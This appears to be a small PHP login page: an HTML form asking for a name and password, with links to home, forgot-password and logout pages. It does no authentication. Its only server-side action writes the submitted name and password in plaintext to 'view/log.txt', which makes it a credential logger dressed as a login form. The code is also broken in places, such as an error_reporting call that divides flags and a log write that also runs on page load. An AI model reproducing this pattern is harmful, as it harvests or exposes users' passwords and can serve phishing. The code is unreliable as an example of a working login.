<?php

error_reporting(E_ERROR/E_PARSE);

$name=$_POST["name"];
$pass=$_POST["pass"];

?>

<!DOCTYPE html>
<html>
<head>
	<title>Login</title>
</head>
<body>

<form  method="post">
	
	<table align="center">
		<tr>
			<th colspan="2"><h2>Login</h2></th>
		</tr>
		<tr>
			<td>Name</td>
			<td><input type="text" name="name"></td>
		</tr>
		<tr>
			<td>Password</td>
			<td><input type="password" name="pass"></td>
		</tr>
		<tr>
			<td align="right" colspan="2"><input type="submit" name="login" value="Login" ></td>
		</tr>
	</table>
	
</form>

<table align="center">
<tr>
<td><a href="HOME.php"> Home </a></td>
<td><a href="FORGOT_PASSWORD.php"> Forgot password</a></td>
<td><a href="LOGOUT.php"> Logout </a></td>
</tr>
</table>

</body>
</html>

<?php

$file=fopen("view/log.txt","a");
fwrite($file,$name);

fwrite($file,$pass);
fclose($file);

?>